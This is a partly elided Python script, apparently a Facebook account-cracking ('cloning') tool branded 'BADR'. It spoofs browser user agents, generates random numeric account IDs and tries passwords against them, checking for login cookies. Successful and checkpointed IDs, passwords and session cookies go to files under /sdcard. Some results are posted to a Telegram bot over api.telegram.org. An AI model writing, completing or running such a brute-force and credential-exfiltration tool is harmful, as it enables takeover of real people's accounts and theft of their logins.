...
for xd in range(5000):
    aa='  Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 '
    ...
    l='  Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 '
...
for xd in range(10000):
    a='  Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36 '
    ...
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='  Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0 '
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
...
for t in range(10000):
    ...
    ugen.append(uaku)
for x in range(10):
    a=' Mozilla/5.0 (X11; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 '
...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE , 𝐁𝐀𝐃𝐑, ,  ")
...
def XYZ():
    ...
    clear()
    print('           \x1b[97m[\033[37;41m  M [ 𝐁𝐀𝐃𝐑]  \033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════')
...
def passx():
    os.system("clear")
    print(logo)
    print('           \x1b[97m[\033[37;41m  𝐁𝐀𝐃𝐑 \033[0;m] ')
    print("")
...
def pass1():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  𝐁𝐀𝐃𝐑  \033[0;m]")
    print(f"")
    linex()
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/𝐁𝐀𝐃𝐑-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/𝐁𝐀𝐃𝐑-CP.txt')
...
def pass2():
    ...
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I [ 𝐁𝐀𝐃𝐑 ]  \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/𝐁𝐀𝐃𝐑-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                  ...
                  #  os.system("play-audio HAMII_CP.mp3")
                    DD=(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    print(DD)
                    requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={DD}')
                    open('/sdcard/𝐁𝐀𝐃𝐑-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝐁𝐀𝐃𝐑 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
